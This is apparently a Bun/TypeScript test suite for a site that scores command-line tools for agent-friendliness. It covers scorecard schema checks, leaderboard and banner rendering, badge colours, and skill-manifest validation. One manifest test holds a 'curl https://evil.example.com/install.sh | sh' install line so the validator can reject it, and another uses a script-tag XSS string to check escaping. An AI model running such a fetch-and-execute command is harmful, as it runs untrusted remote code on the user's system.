      JSON.stringify(makeV06Scorecard({ tool: { name: 'beta', binary: 'beta', version: 'beta 1.2.3' } })),
    );
    try {
      const registry = [
        {
          name: 'alpha',
          repo: 'a/b',
          binary: 'fixture',
          language: 'Rust',
          tier: 'workhorse',
          creator: 'me',
          description: 'x',
        },
        {
          name: 'beta',
          repo: 'c/d',
          binary: 'beta',
          language: 'Rust',
          tier: 'workhorse',
          creator: 'me',
          description: 'y',
        },
      ];
      const { tools } = await loadScoredTools(dir, registry);
      const versions = tools.map((t: any) => t.scorecard.schema_version).sort();
      expect(versions).toEqual(['0.5', '0.6']);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });

  test('rejects a schema version above the supported set (e.g. 0.7)', async () => {
    const dir = join(tmpdir(), `scorecards-future-${Date.now()}`);
    await mkdir(dir, { recursive: true });
    await writeFile(join(dir, 'fixture-v1.2.3.json'), JSON.stringify(makeV06Scorecard({ schema_version: '0.7' })));
    try {
      const registry = [
        {
          name: 'fixture',
          repo: 'a/b',
          binary: 'fixture',
          language: 'Rust',
          tier: 'workhorse',
          creator: 'me',
          description: 'thing',
        },
      ];
      await expect(loadScoredTools(dir, registry)).rejects.toThrow(
        /schema_version "0\.7" not supported.*Site supports schema 0\.5, 0\.6/,
      );
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });
});

describe('runScorecardInvariants — v0.4 corpus invariants', () => {
  // Helper: build a registry array with one entry per provided shape override.
  function makeRegistry(entries: Array<Record<string, any>>) {
    return entries.map((overrides) => ({
      repo: 'a/b',
      language: 'Rust',
      tier: 'workhorse',
      creator: 'me',
      description: 'thing',
      ...overrides,
    }));
  }

  async function withCorpus(
    files: Array<{ name: string; content: any }>,
    fn: (dir: string) => Promise<void>,
  ): Promise<void> {
    const dir = join(tmpdir(), `corpus-${Date.now()}-${Math.random().toString(36).slice(2)}`);
    await mkdir(dir, { recursive: true });
    try {
      for (const { name, content } of files) {
        await writeFile(join(dir, name), typeof content === 'string' ? content : JSON.stringify(content));
      }
      await fn(dir);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  }

  test('passes for a clean v0.4 corpus', async () => {
    await withCorpus([{ name: 'fixture-v1.2.3.json', content: makeV04Scorecard() }], async (dir) => {
      const registry = makeRegistry([{ name: 'fixture', binary: 'fixture' }]);
      await runScorecardInvariants(dir, registry);
    });
  });

  test('passes for a name ≠ binary tool (e.g., ripgrep / rg)', async () => {
    await withCorpus(
      [
        {
          name: 'ripgrep-v15.1.0.json',
          content: makeV04Scorecard({
            tool: { name: 'rg', binary: 'rg', version: 'ripgrep 15.1.0' },
          }),
        },
      ],
      async (dir) => {
        const registry = makeRegistry([{ name: 'ripgrep', binary: 'rg' }]);
        // Filename slug → registry.name lookup; tool.name → registry.binary check.
        await runScorecardInvariants(dir, registry);
      },
    );
  });

  test('skips invariants (c)/(d)/(e) for grandfathered anc-v0.1.3.json', async () => {
    const grandfathered = {
      schema_version: '1.1',
      audience: null,
      audit_profile: null,
      coverage_summary: null,
      summary: { total: 0, pass: 0, warn: 0, fail: 0, skip: 0, error: 0 },
      results: [],
    };
    await withCorpus([{ name: 'anc-v0.1.3.json', content: grandfathered }], async (dir) => {
      const registry = makeRegistry([{ name: 'anc', binary: 'anc' }]);
      await runScorecardInvariants(dir, registry);
    });
  });

  test('admits future schema_version bumps (e.g. 0.5)', async () => {
    await withCorpus(
      [{ name: 'fixture-v1.2.3.json', content: makeV04Scorecard({ schema_version: '0.5' }) }],
      async (dir) => {
        const registry = makeRegistry([{ name: 'fixture', binary: 'fixture' }]);
        await runScorecardInvariants(dir, registry);
      },
    );
  });

  test('throws when schema_version is below floor "0.4"', async () => {
    await withCorpus(
      [{ name: 'fixture-v1.2.3.json', content: makeV04Scorecard({ schema_version: '0.3' }) }],
      async (dir) => {
        const registry = makeRegistry([{ name: 'fixture', binary: 'fixture' }]);
        await expect(runScorecardInvariants(dir, registry)).rejects.toThrow(/below floor "0.4"/);
      },
    );
  });

  test('throws when filename slug has no registry entry', async () => {
    await withCorpus(
      [
        {
          name: 'orphan-v1.0.0.json',
          content: makeV04Scorecard({ tool: { name: 'orphan', binary: 'orphan', version: '1.0.0' } }),
        },
      ],
      async (dir) => {
        const registry = makeRegistry([{ name: 'fixture', binary: 'fixture' }]);
        await expect(runScorecardInvariants(dir, registry)).rejects.toThrow(/no matching registry entry/);
      },
    );
  });

  test('throws when scorecard.tool.name !== registry.binary (mistargeted regen)', async () => {
    await withCorpus(
      [
        {
          name: 'ripgrep-v15.1.0.json',
          // CLI scored "rgg" (a typo) but the registry says binary is "rg".
          content: makeV04Scorecard({ tool: { name: 'rgg', binary: 'rg', version: 'ripgrep 15.1.0' } }),
        },
      ],
      async (dir) => {
        const registry = makeRegistry([{ name: 'ripgrep', binary: 'rg' }]);
        await expect(runScorecardInvariants(dir, registry)).rejects.toThrow(/tool.name.*!==.*binary/);
      },
    );
  });

  test('throws when run.started_at is non-parseable', async () => {
    await withCorpus(
      [
        {
          name: 'fixture-v1.2.3.json',
          content: makeV04Scorecard({
            run: {
              invocation: 'anc check',
              started_at: 'not-a-timestamp',
              duration_ms: 1,
              platform: { os: 'linux', arch: 'x86_64' },
            },
          }),
        },
      ],
      async (dir) => {
        const registry = makeRegistry([{ name: 'fixture', binary: 'fixture' }]);
        await expect(runScorecardInvariants(dir, registry)).rejects.toThrow(/run.started_at.*not a valid RFC 3339/);
      },
    );
  });

  test('throws on tool.version-vs-filename SemVer drift', async () => {
    await withCorpus(
      [
        {
          name: 'fixture-v1.2.3.json',
          content: makeV04Scorecard({
            tool: { name: 'fixture', binary: 'fixture', version: 'fixture 9.9.9' },
          }),
        },
      ],
      async (dir) => {
        const registry = makeRegistry([{ name: 'fixture', binary: 'fixture' }]);
        await expect(runScorecardInvariants(dir, registry)).rejects.toThrow(/does not match filename version/);
      },
    );
  });

  test('skips invariant (e) when tool.version has no SemVer token (CLI raw output)', async () => {
    // Real CLI behavior in v0.4: tool.version is the raw `--version` first
    // line, which often lacks a clean SemVer (e.g. eza's marketing line, cf's
    // ASCII-art logo). Skip the equality check rather than firing on every row.
    await withCorpus(
      [
        {
          name: 'eza-v0.23.4.json',
          content: makeV04Scorecard({
            tool: { name: 'eza', binary: 'eza', version: 'eza - A modern, maintained replacement for ls' },
          }),
        },
      ],
      async (dir) => {
        const registry = makeRegistry([{ name: 'eza', binary: 'eza' }]);
        await runScorecardInvariants(dir, registry);
      },
    );
  });

  test("admits null tool.version (CLI couldn't parse --version)", async () => {
    await withCorpus(
      [
        {
          name: 'fixture-v1.2.3.json',
          content: makeV04Scorecard({
            tool: { name: 'fixture', binary: 'fixture', version: null },
          }),
        },
      ],
      async (dir) => {
        const registry = makeRegistry([{ name: 'fixture', binary: 'fixture' }]);
        await runScorecardInvariants(dir, registry);
      },
    );
  });
});

describe('computePrincipleScore', () => {
  test('maps P1-P8 groups correctly, excludes CodeQuality/ProjectStructure', () => {
    const sc = makeScorecard();
    const ps = computePrincipleScore(sc);
    expect(ps.total).toBe(8);
    // P1=pass, P2=fail, P3=pass, P4=pass, P5=skip(no checks), P6=partial(has warn),
    // P7=pass, P8=skip(no checks)
    expect(ps.met).toBe(4); // P1, P3, P4, P7
    expect(ps.details.find((d: any) => d.group === 'P2')?.status).toBe('fail');
    expect(ps.details.find((d: any) => d.group === 'P6')?.status).toBe('partial');
    expect(ps.details.find((d: any) => d.group === 'P8')?.status).toBe('skip');
  });

  test('returns 0/8 for null scorecard', () => {
    const ps = computePrincipleScore(null);
    expect(ps.met).toBe(0);
    expect(ps.total).toBe(8);
  });
});

describe('computeLayerScore', () => {
  test('separates behavioral+project from source checks', () => {
    const sc = makeScorecard();
    const ls = computeLayerScore(sc);
    expect(ls.primary).toBeGreaterThan(0);
    expect(ls.source).toBeNull(); // fixture has no source-layer checks
  });
});

describe('extractTopIssues', () => {
  test('returns FAIL checks before WARN checks, limited to N', () => {
    const sc = makeScorecard();
    const issues = extractTopIssues(sc, 3);
    expect(issues.length).toBeLessThanOrEqual(3);
    // First issue should be the fail (P2)
    expect(issues[0].status).toBe('fail');
    // Second should be the warn (P6)
    expect(issues[1].status).toBe('warn');
  });

  test('returns empty array for null scorecard', () => {
    expect(extractTopIssues(null)).toEqual([]);
  });
});

describe('computeLeaderboard', () => {
  // Helper: synthesize the schema 0.5 `badge` block from a target percent
  // so the leaderboard sort (which reads `scorecard.badge.score_pct`) has
  // the field it expects. Post-U3 inversion every leaderboard entry has a
  // scorecard; the unscored-tools-sort-to-bottom branch is gone.
  function withBadge(name: string, scorePct: number) {
    return {
      ...makeScorecard(),
      badge: {
        eligible: scorePct >= 70,
        score_pct: scorePct,
        embed_markdown: `[![agent-native](https://anc.dev/badge/${name}.svg)](https://anc.dev/score/${name})`,
        scorecard_url: `https://anc.dev/score/${name}`,
        badge_url: `https://anc.dev/badge/${name}.svg`,
        convention_url: 'https://anc.dev/badge',
      },
    };
  }

  test('sorts tools by descending badge.score_pct', () => {
    const tools = [
      { tool: { name: 'low', tier: 'workhorse' }, scorecard: withBadge('low', 25) },
      { tool: { name: 'high', tier: 'agent' }, scorecard: withBadge('high', 100) },
      { tool: { name: 'mid', tier: 'workhorse' }, scorecard: withBadge('mid', 75) },
    ];
    const lb = computeLeaderboard(tools as any);
    expect(lb[0].tool.name).toBe('high');
    expect(lb[0].rank).toBe(1);
    expect(lb[1].tool.name).toBe('mid');
    expect(lb[2].tool.name).toBe('low');
    expect(lb[2].rank).toBe(3);
  });

  test('empty registry returns empty leaderboard', () => {
    expect(computeLeaderboard([])).toEqual([]);
  });
});

// -------------------------------------------------------------------
// renderAudienceBanner — H6 audience banner v2 (conditional + branched copy)
// -------------------------------------------------------------------

describe('renderAudienceBanner', () => {
  test('returns empty when no audience and no audit_profile (v1.0–v1.2 compat)', () => {
    expect(renderAudienceBanner(null, null)).toBe('');
    expect(renderAudienceBanner(undefined, undefined)).toBe('');
  });

  test('returns empty for agent-optimized with no audit_profile', () => {
    // Banner suppressed: the *absence* of a banner is the signal that the
    // tool reads as agent-native with no profile-level scoping.
    expect(renderAudienceBanner('agent-optimized', null)).toBe('');
  });

  test('renders headline + copy for human-primary', () => {
    const html = renderAudienceBanner('human-primary', null);
    expect(html).toContain('class="scorecard-audience-banner"');
    expect(html).toContain('<strong>human-primary</strong>');
    expect(html).toContain('optimized for human use');
    // Methodology link always present in the note line.
    expect(html).toContain('href="/methodology');
  });

  test('renders headline + copy for mixed', () => {
    const html = renderAudienceBanner('mixed', null);
    expect(html).toContain('<strong>mixed</strong>');
    expect(html).toContain('mixed signals');
  });

  test('renders profile pill + copy when audit_profile is set on agent-optimized', () => {
    // Banner appears even when audience is agent-optimized, as long as a
    // profile applied — the reader needs to know suppression was in effect.
    const html = renderAudienceBanner('agent-optimized', 'human-tui');
    expect(html).toContain('class="scorecard-audience-banner"');
    expect(html).toContain('class="audit-profile-pill"');
    expect(html).toContain('human-tui');
    expect(html).toContain('TUI');
    // No headline line in this case — agent-optimized doesn't get one.
    expect(html).not.toContain('<strong>agent-optimized</strong>');
  });

  test('renders both headline and profile copy when both are present', () => {
    const html = renderAudienceBanner('human-primary', 'human-tui');
    expect(html).toContain('<strong>human-primary</strong>');
    expect(html).toContain('class="audit-profile-pill"');
  });

  test('renders profile-specific copy for each known category', () => {
    expect(renderAudienceBanner(null, 'human-tui')).toContain('TUI');
    expect(renderAudienceBanner(null, 'file-traversal')).toContain('fd/find-style');
    expect(renderAudienceBanner(null, 'posix-utility')).toContain('POSIX');
    expect(renderAudienceBanner(null, 'diagnostic-only')).toContain('read-only');
  });

  test('falls through to safe default for unknown audience', () => {
    const html = renderAudienceBanner('unexpected_label', null);
    expect(html).toContain('classified as unexpected_label');
  });

  test('falls through to safe default for unknown audit_profile', () => {
    const html = renderAudienceBanner(null, 'novel-category');
    expect(html).toContain('audit profile');
    expect(html).toContain('novel-category');
  });

  test('escapes HTML in unknown audience values', () => {
    const html = renderAudienceBanner('<script>alert(1)</script>', null);
    expect(html).not.toContain('<script>alert(1)</script>');
    expect(html).toContain('&lt;script&gt;');
  });
});

// -------------------------------------------------------------------
// renderCheckRows (via buildScorecardBody) — suppressed-check rendering
// -------------------------------------------------------------------

describe('suppressed-check rendering', () => {
  // Minimal v1.3-shaped scorecard with one organic Skip and one
  // audit_profile-suppressed Skip in the same principle group.
  function suppressedScorecard() {
    return {
      schema_version: '0.5',
      audience: null,
      audit_profile: 'human-tui',
      results: [
        {
          id: 'p1-non-interactive',
          label: 'Non-interactive by default',
          group: 'P1',
          layer: 'behavioral',
          status: 'skip',
          evidence: 'suppressed by audit_profile: human-tui',
        },
        {
          id: 'p3-after-help',
          label: 'after_help section present',
          group: 'P3',
          layer: 'behavioral',
          status: 'skip',
          evidence: 'no flags exposed',
        },
        {
          id: 'p2-json-output',
          label: 'Structured output support',
          group: 'P2',
          layer: 'behavioral',
          status: 'pass',
          evidence: null,
        },
      ],
      summary: { total: 3, pass: 1, warn: 0, fail: 0, skip: 2, error: 0 },
      badge: {
        eligible: false,
        score_pct: 100,
        embed_markdown: '[![agent-native](https://anc.dev/badge/lazygit.svg)](https://anc.dev/score/lazygit)',
        scorecard_url: 'https://anc.dev/score/lazygit',
        badge_url: 'https://anc.dev/badge/lazygit.svg',
        convention_url: 'https://anc.dev/badge',
      },
    };
  }

  const tool = {
    name: 'lazygit',
    binary: 'lazygit',
    language: 'Go',
    tier: 'workhorse',
    creator: 'Jesse Duffield',
    description: 'TUI for git',
    repo: 'jesseduffield/lazygit',
  };

  test('audit_profile-suppressed Skip gets check--suppressed class and "N/A by <category>" status', () => {
    const sc = suppressedScorecard();
    const html = buildScorecardBody(tool, sc, [], { met: 0, total: 7, details: [] });
    expect(html).toContain('check--suppressed');
    expect(html).toContain('N/A by human-tui');
  });

  test('organic Skip retains check--skip without check--suppressed', () => {
    const sc = suppressedScorecard();
    const html = buildScorecardBody(tool, sc, [], { met: 0, total: 7, details: [] });
    // The organic skip row's status cell still shows "SKIP" uppercase.
    expect(html).toContain('>SKIP<');
    // And it must NOT carry the suppressed class.
    const organicSkipMatch = html.match(/<tr class="([^"]*)">\s*<td class="check__status">SKIP<\/td>/);
    expect(organicSkipMatch).not.toBeNull();
    expect(organicSkipMatch?.[1]).not.toContain('check--suppressed');
  });

  test('non-suppression Skip evidence is preserved verbatim', () => {
    const sc = suppressedScorecard();
    const html = buildScorecardBody(tool, sc, [], { met: 0, total: 7, details: [] });
    expect(html).toContain('no flags exposed');
  });

  test('only matches the exact CLI prefix "suppressed by audit_profile: " (with trailing space)', () => {
    // Pins the contract documented at SUPPRESSION_EVIDENCE_PREFIX in
    // agentnative/src/principles/registry.rs. A near-miss like
    // "suppressed by audit_profile_human-tui" must NOT be treated as
    // suppression — it's an organic Skip with prose evidence.
    const sc = {
      schema_version: '0.5',
      audience: null,
      audit_profile: null,
      results: [
        {
          id: 'p1-x',
          label: 'X',
          group: 'P1',
          layer: 'behavioral',
          status: 'skip',
          // Looks similar but isn't the contract — no colon-space.
          evidence: 'suppressed by audit_profile_human-tui',
        },
      ],
      summary: { total: 1, pass: 0, warn: 0, fail: 0, skip: 1, error: 0 },
      badge: {
        eligible: false,
        score_pct: 0,
        embed_markdown: '[![agent-native](https://anc.dev/badge/lazygit.svg)](https://anc.dev/score/lazygit)',
        scorecard_url: 'https://anc.dev/score/lazygit',
        badge_url: 'https://anc.dev/badge/lazygit.svg',
        convention_url: 'https://anc.dev/badge',
      },
    };
    const html = buildScorecardBody(tool, sc, [], { met: 0, total: 7, details: [] });
    expect(html).not.toContain('check--suppressed');
    expect(html).not.toContain('N/A by');
    // The status cell stays as the regular SKIP pill.
    expect(html).toContain('>SKIP<');
  });
});

// -------------------------------------------------------------------
// buildLeaderboardBody — H6 leaderboard data attrs + audience filter
// -------------------------------------------------------------------

describe('buildLeaderboardBody — audience filter wiring', () => {
  // Post-U3: every leaderboard entry has a scorecard. The (audience,
  // audit_profile) fields may still both be undefined on older scorecard
  // shapes — the renderer escapes them to empty strings.
  function entry(name: string, audience: string | null, auditProfile: string | null) {
    return {
      tool: {
        name,
        tier: 'workhorse',
        language: 'Rust',
        description: `${name} tool`,
      },
      scorecard: {
        audience,
        audit_profile: auditProfile,
        results: [],
        summary: { pass: 1, warn: 0, fail: 0 },
        badge: {
          eligible: true,
          score_pct: 100,
          embed_markdown: `[![agent-native](https://anc.dev/badge/${name}.svg)](https://anc.dev/score/${name})`,
          scorecard_url: `https://anc.dev/score/${name}`,
          badge_url: `https://anc.dev/badge/${name}.svg`,
          convention_url: 'https://anc.dev/badge',
        },
      },
      principleScore: { met: 7, total: 7, details: [] },
      rank: 1,
    };
  }

  test('emits data-audience and data-audit-profile attrs on each row', () => {
    const lb = [entry('rg', 'agent-optimized', null), entry('lazygit', null, 'human-tui')];
    const html = buildLeaderboardBody(lb as any, '<p>m</p>');
    expect(html).toContain('data-audience="agent-optimized"');
    expect(html).toContain('data-audit-profile="human-tui"');
  });

  test('emits empty data-audience for pre-v1.3 scorecards (audience field absent)', () => {
    // Post-U3 every leaderboard entry has a scorecard, but `audience` and
    // `audit_profile` may still be undefined on older scorecard shapes.
    // The renderer falls back to empty strings for both.
    const lb = [entry('newtool', null, null)];
    const html = buildLeaderboardBody(lb as any, '<p>m</p>');
    expect(html).toContain('data-audience=""');
    expect(html).toContain('data-audit-profile=""');
  });

  test('emits the agent-optimized-only toggle and methodology link', () => {
    const html = buildLeaderboardBody([entry('rg', 'agent-optimized', null)] as any, '<p>m</p>');
    expect(html).toContain('data-filter="agent-optimized-only"');
    expect(html).toContain('Agent-optimized only');
    // Methodology link in the hero lede.
    expect(html).toContain('href="/methodology"');
  });

  test('hero carries an "N audited tools in the corpus" subhead (corpus-descriptor framing)', () => {
    // U3 inversion: the leaderboard hero gains a corpus-descriptor subhead
    // that's stable under client-side audience-filter toggles. The redundant
    // (N) from the All tier-filter button is dropped.
    const lb = [entry('rg', 'agent-optimized', null), entry('lazygit', null, 'human-tui'), entry('eza', null, null)];
    const html = buildLeaderboardBody(lb as any, '<p>m</p>');
    expect(html).toContain('class="leaderboard-hero__meta"');
    expect(html).toContain('3 audited tools in the corpus');
    // All button no longer carries the redundant "(N)" count — the new
    // subhead owns the headcount.
    expect(html).toContain('data-tier="all">All<');
    expect(html).not.toContain('data-tier="all">All (3)<');
  });
});

// -------------------------------------------------------------------
// Regression guard — H6 Unit 0.5 audience kebab-case alignment
// -------------------------------------------------------------------
//
// `anc` v0.1.3 emits kebab-case audience values (`agent-optimized`,
// `human-primary`). Snake_case (`agent_optimized`, `human_primary`) was
// the pre-flip shape and must never reappear in the site repo — if it
// does, the leaderboard's "Agent-optimized only" toggle silently
// excludes every row and the audience banner falls through to its
// fallback copy. Both failures are silent (no exception), so this test
// is the only thing that catches the regression before users do.
//
// Mirrors the plan's verification step:
//   `rg 'agent_optimized|human_primary' src/ tests/ content/`
//
// Bun test (not biome rule) because the snake_case strings live in
// content/methodology.md as user-visible prose; biome's lint patterns
// are TS/JS-only.

import { readdirSync, readFileSync, statSync } from 'node:fs';
import { join as joinPath } from 'node:path';

describe('audience kebab-case regression guard (H6 Unit 0.5)', () => {
  // The CLI v0.1.3 contract: audience values serialize as kebab-case.
  // See `agentnative/src/scorecard/audience.rs` and the H6 plan.
  const SNAKE_CASE_AUDIENCE_LITERALS = ['agent_optimized', 'human_primary'];

  const SCAN_ROOTS = ['src', 'tests', 'content'];
  // Self-reference exception: this test file MUST contain the snake_case
  // literals as test data — that's why we declare them as constants
  // above. Excluding by absolute path keeps the guard from regressing
  // on its own existence.
  const SELF_PATH = import.meta.path;

  function* walk(dir: string): Generator<string> {
    for (const entry of readdirSync(dir)) {
      const full = joinPath(dir, entry);
      if (statSync(full).isDirectory()) {
        yield* walk(full);
      } else if (/\.(ts|js|mjs|cjs|tsx|jsx|md)$/.test(entry)) {
        yield full;
      }
    }
  }

  test(`no snake_case audience literals in ${SCAN_ROOTS.join(', ')}/`, () => {
    const repoRoot = joinPath(import.meta.dir, '..');
    const offenders: Array<{ file: string; literal: string; line: number }> = [];

    for (const root of SCAN_ROOTS) {
      for (const file of walk(joinPath(repoRoot, root))) {
        if (file === SELF_PATH) continue;
        const text = readFileSync(file, 'utf8');
        const lines = text.split('\n');
        for (let i = 0; i < lines.length; i++) {
          for (const literal of SNAKE_CASE_AUDIENCE_LITERALS) {
            if (lines[i].includes(literal)) {
              offenders.push({
                file: file.slice(repoRoot.length + 1),
                literal,
                line: i + 1,
              });
            }
          }
        }
      }
    }

    if (offenders.length > 0) {
      const msg = offenders.map((o) => `  ${o.file}:${o.line} → "${o.literal}"`).join('\n');
      throw new Error(
        `Found snake_case audience literal(s) — anc v0.1.3 emits kebab-case ` +
          `(agent-optimized / human-primary). See H6 plan Unit 0.5.\n${msg}`,
      );
    }
  });
});

describe('loadSkillData — fail-fast validation', () => {
  function validManifest() {
    return {
      schema_version: 1,
      type: 'agent-skill',
      name: 'agent-native-cli',
      version: '0.1.0',
      description: 'desc',
      principles_url: 'https://anc.dev/p1',
      license: 'MIT',
      source: {
        type: 'git',
        url: 'https://github.com/brettdavies/agentnative-skill.git',
      },
      install: {
        claude_code:
          'git clone --depth 1 https://github.com/brettdavies/agentnative-skill.git ~/.claude/skills/agent-native-cli',
      },
      update: 'cd <install-dir> && git pull --ff-only',
      uninstall: 'rm -rf <install-dir>',
      skill_page_html: 'https://anc.dev/skill',
    };
  }

  async function writeAndLoad(manifest: unknown): Promise<unknown> {
    const dir = join(tmpdir(), `loadSkillData-${Date.now()}-${Math.random()}`);
    await mkdir(dir, { recursive: true });
    const path = join(dir, 'skill.json');
    await writeFile(path, JSON.stringify(manifest));
    try {
      return await loadSkillData(path);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  }

  test('happy path: valid manifest loads', async () => {
    const data = (await writeAndLoad(validManifest())) as { source: { url: string } };
    expect(data.source.url).toBe('https://github.com/brettdavies/agentnative-skill.git');
  });

  test('missing top-level key fails with the key name', async () => {
    const m = validManifest() as Record<string, unknown>;
    delete m.license;
    await expect(writeAndLoad(m)).rejects.toThrow(/missing required key "license"/);
  });

  test('non-semver version rejected', async () => {
    const m = validManifest();
    m.version = '0.1';
    await expect(writeAndLoad(m)).rejects.toThrow(/must be semver/);
  });

  test('empty install map rejected (R5: at least one host)', async () => {
    const m = validManifest();
    m.install = {} as Record<string, string>;
    await expect(writeAndLoad(m)).rejects.toThrow(/at least one host/);
  });

  test('install command without git clone --depth 1 prefix rejected', async () => {
    const m = validManifest();
    m.install.claude_code = 'curl https://evil.example.com/install.sh | sh';
    await expect(writeAndLoad(m)).rejects.toThrow(/must start with "git clone --depth 1 "/);
  });

  test('bare-clone (no destination path) rejected — defends repo-name asymmetry', async () => {
    const m = validManifest();
    m.install.claude_code = 'git clone --depth 1 https://github.com/brettdavies/agentnative-skill.git';
    await expect(writeAndLoad(m)).rejects.toThrow(/explicit destination path/);
  });

  test('invalid JSON rejected', async () => {
    const dir = join(tmpdir(), `loadSkillData-bad-${Date.now()}`);
    await mkdir(dir, { recursive: true });
    const path = join(dir, 'skill.json');
    await writeFile(path, '{not valid');
    try {
      await expect(loadSkillData(path)).rejects.toThrow(/invalid JSON/);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });
});

// -------------------------------------------------------------------
// badge-maker rendering — color thresholds, label format, SVG output
// -------------------------------------------------------------------

describe('badgeColor — cohort-band mapping', () => {
  const EXEMPLARY = '#005da1';
  const STRONG = '#007b80';
  const SOLID = '#0a7e3a';
  const QUALIFIED = '#976200';
  const BELOW = '#bf5200';
  const CRITICAL = '#af2b25';

  test('≥ 85 → navy (Exemplary)', () => {
    expect(badgeColor(100)).toBe(EXEMPLARY);
    expect(badgeColor(85)).toBe(EXEMPLARY);
  });

  test('80–84 → teal (Strong)', () => {
    expect(badgeColor(84)).toBe(STRONG);
    expect(badgeColor(80)).toBe(STRONG);
  });

  test('75–79 → green (Solid)', () => {
    expect(badgeColor(79)).toBe(SOLID);
    expect(badgeColor(75)).toBe(SOLID);
  });

  test('70–74 → ochre (Qualified — at the eligibility floor)', () => {
    expect(badgeColor(74)).toBe(QUALIFIED);
    expect(badgeColor(70)).toBe(QUALIFIED);
  });

  test('69 → orange — one point below the floor flips the color', () => {
    expect(badgeColor(69)).toBe(BELOW);
    expect(badgeColor(50)).toBe(BELOW);
  });

  test('< 50 → red (critical)', () => {
    expect(badgeColor(49)).toBe(CRITICAL);
    expect(badgeColor(0)).toBe(CRITICAL);
  });
});

describe('badgeFormat — label, message, color contract', () => {
  test('label cites major.minor of spec version (patch dropped)', () => {
    const f = badgeFormat(0.91, '0.3.0');
    expect(f.label).toBe('agent-native v0.3');
  });

  test('label drops a non-zero patch component too', () => {
    const f = badgeFormat(0.91, '1.4.7');
    expect(f.label).toBe('agent-native v1.4');
  });

  test('default specVersion equals exported SPEC_VERSION constant', () => {
    const f = badgeFormat(0.91);
    const expected = SPEC_VERSION.split('.').slice(0, 2).join('.');
    expect(f.label).toBe(`agent-native v${expected}`);
  });

  test('message rounds the 0–1 score to integer percent', () => {
    expect(badgeFormat(0.916).message).toBe('92%');
    expect(badgeFormat(0.9149).message).toBe('91%');
    expect(badgeFormat(1.0).message).toBe('100%');
    expect(badgeFormat(0).message).toBe('0%');
  });

  test('color follows badgeColor of the rounded percent across the bands', () => {
    expect(badgeFormat(0.91).color).toBe('#005da1'); // Exemplary
    expect(badgeFormat(0.8).color).toBe('#007b80'); //  Strong
    expect(badgeFormat(0.77).color).toBe('#0a7e3a'); // Solid
    expect(badgeFormat(0.7).color).toBe('#976200'); //  Qualified (floor)
    expect(badgeFormat(0.69).color).toBe('#bf5200'); // below floor
    expect(badgeFormat(0.42).color).toBe('#af2b25'); // critical
  });

  test('style is flat — visually identical to shields.io defaults', () => {
    expect(badgeFormat(0.91).style).toBe('flat');
  });
});

describe('renderBadgeSvg — SVG output', () => {
  test('emits SVG with declared label and message in title', () => {
    const svg = renderBadgeSvg(0.91, '0.3.0');
    expect(svg).toContain('<svg');
    expect(svg).toContain('agent-native v0.3');
    expect(svg).toContain('91%');
    expect(svg).toContain('</svg>');
  });

  test('Exemplary badge uses the navy fill (#005da1)', () => {
    const svg = renderBadgeSvg(1.0, '0.3.0');
    expect(svg).toContain('#005da1');
  });

  test('below-floor badge renders the orange fill, not a top-band color — regression stays honest', () => {
    const svg = renderBadgeSvg(0.5, '0.3.0');
    expect(svg).toContain('#bf5200');
    expect(svg).not.toContain('#005da1');
  });
});

// -------------------------------------------------------------------
// Scorecard embed snippet (surface #1 of the badge plan).
// Above-floor: copy-paste snippet + SVG preview. Below-floor: hint
// pointing at /badge and the top-issues section.
// -------------------------------------------------------------------

describe('buildScorecardBody — embed-snippet gating', () => {
  function tool(name = 'rg') {
    return {
      name,
      binary: name,
      description: 'fast grep',
      tier: 'workhorse',
      language: 'rust',
      creator: 'BurntSushi',
      install: `brew install ${name}`,
      repo: `BurntSushi/${name}`,
    };
  }

  function sc(passes: number, fails: number) {
    const results: any[] = [];
    for (let i = 0; i < passes; i++) {
      results.push({
        id: `p${i}`,
        label: `pass${i}`,
        group: 'P1',
        layer: 'behavioral',
        status: 'pass',
        evidence: null,
      });
    }
    for (let i = 0; i < fails; i++) {
      results.push({
        id: `f${i}`,
        label: `fail${i}`,
        group: 'P2',
        layer: 'behavioral',
        status: 'fail',
        evidence: 'no flag',
      });
    }
    const score_pct = Math.round((passes / (passes + fails)) * 100);
    return {
      schema_version: '0.5',
      summary: { total: passes + fails, pass: passes, warn: 0, fail: fails, skip: 0, error: 0 },
      results,
      badge: {
        eligible: score_pct >= 70,
        score_pct,
        embed_markdown: '[![agent-native](https://anc.dev/badge/rg.svg)](https://anc.dev/score/rg)',
        scorecard_url: 'https://anc.dev/score/rg',
        badge_url: 'https://anc.dev/badge/rg.svg',
        convention_url: 'https://anc.dev/badge',
      },
    };
  }

  test('eligible (score=1.0) renders copy-paste snippet + SVG preview', () => {
    const html = buildScorecardBody(tool('rg'), sc(10, 0), [], { met: 7, total: 7, details: [] });
    expect(html).toContain('scorecard-embed--eligible');
    expect(html).not.toContain('scorecard-embed--below');
    expect(html).toContain('badge/rg.svg');
    expect(html).toContain('clears the <a href="/badge">badge floor</a>');
    // Live preview img so the copyable shape and what it actually looks like sit side-by-side.
    expect(html).toContain('<img src="/badge/rg.svg"');
    expect(html).toContain('alt="agent-native badge for rg"');
  });

  test('eligible at exactly the floor (score=0.70) — brightline check, >= not >', () => {
    const html = buildScorecardBody(tool('rg'), sc(7, 3), [], { met: 5, total: 8, details: [] });
    expect(html).toContain('scorecard-embed--eligible');
    expect(html).not.toContain('scorecard-embed--below');
  });

  test('one point below the floor (score=0.69) renders the below-floor hint', () => {
    const sc69 = sc(69, 31);
    const issues = [{ id: 'f0', label: 'fail0', group: 'P2', status: 'fail', evidence: 'no flag' }];
    const html = buildScorecardBody(tool('rg'), sc69, issues, { met: 4, total: 8, details: [] });
    expect(html).toContain('scorecard-embed--below');
    expect(html).not.toContain('scorecard-embed--eligible');
    expect(html).not.toContain('<img src="/badge/rg.svg"'); // no preview image below the floor
    expect(html).toContain('1 point below'); // singular for a 1-point gap (70 - 69 = 1)
    expect(html).toContain('top issues above are the place to start'); // points at existing issues section
  });

  test('below-floor with no top issues references the full check list instead', () => {
    const html = buildScorecardBody(tool('rg'), sc(6, 4), [], { met: 4, total: 8, details: [] });
    expect(html).toContain('See the full check results below for the gaps.');
    expect(html).not.toContain('top issues above are the place to start');
  });

  test('below-floor gap math: 65% scorecard is 5 points below the 70% floor (plural)', () => {
    const html = buildScorecardBody(tool('rg'), sc(65, 35), [], { met: 3, total: 8, details: [] });
    expect(html).toContain('5 points below');
  });
});

